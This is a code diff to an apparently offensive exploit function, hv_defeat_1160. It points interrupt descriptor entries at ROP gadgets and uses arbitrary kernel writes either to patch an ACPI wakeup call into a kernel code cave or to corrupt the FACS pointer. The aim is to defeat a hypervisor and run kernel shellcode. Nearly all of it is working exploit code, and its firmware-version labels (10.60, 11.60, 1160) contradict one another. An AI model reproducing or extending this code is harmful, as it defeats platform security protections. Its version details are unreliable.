@@ -595,9 +595,24 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   setidt(13, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
   setidt(30, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
 
-  /* As on 13.60, corrupt the FACS pointer so the stock wake path reaches
-   * the #GP/#SX copy-and-transfer chain after NPT has been disabled. */
-  kwrite64(kg(env_offset.ACPIGBL_FACS), kg(env_offset.ACPIGBL_FACS) - 8);
+  if (env_offset.HOOK_ACPI_WAKEUP_MACHDEP) {
+    /* 10.60: A53 firmware validates Special Wake and rejects a corrupted
+     * FACS pointer, forcing a cold reboot before our ROP can run.  Patch
+     * the call to AcpiSetFirmwareWakingVector in acpi_wakeup_machdep's
+     * resume tail to jump directly to the kernel code cave instead.
+     * FACS is left intact so the A53 accepts the wake normally. */
+    uint8_t patched_call[5];
+    patched_call[0] = 0xE8;
+    int64_t rel = (int64_t)(ktext + env_offset.KERNEL_CODE_CAVE) -
+                  (int64_t)(ktext + env_offset.HOOK_ACPI_WAKEUP_MACHDEP + 5);
+    *((int32_t *)&patched_call[1]) = (int32_t)rel;
+    kwrite(ktext + env_offset.HOOK_ACPI_WAKEUP_MACHDEP, patched_call,
+           sizeof(patched_call));
+  } else {
+    /* As on 13.60, corrupt the FACS pointer so the stock wake path reaches
+     * the #GP/#SX copy-and-transfer chain after NPT has been disabled. */
+    kwrite64(kg(env_offset.ACPIGBL_FACS), kg(env_offset.ACPIGBL_FACS) - 8);
+  }
 
   notify("11.60 Linux wake chain armed\n");
   return 0;
